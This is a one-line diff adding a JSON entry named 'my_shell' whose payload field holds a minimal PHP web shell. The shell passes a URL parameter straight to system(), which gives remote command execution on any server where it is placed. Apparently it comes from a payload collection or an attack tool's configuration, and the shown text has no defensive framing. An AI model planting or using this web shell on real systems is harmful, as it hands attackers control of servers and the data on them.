@@ -1,0 +1,1 @@
+{"name": "my_shell", "payload": "<?php system($_GET['cmd']); ?>"}
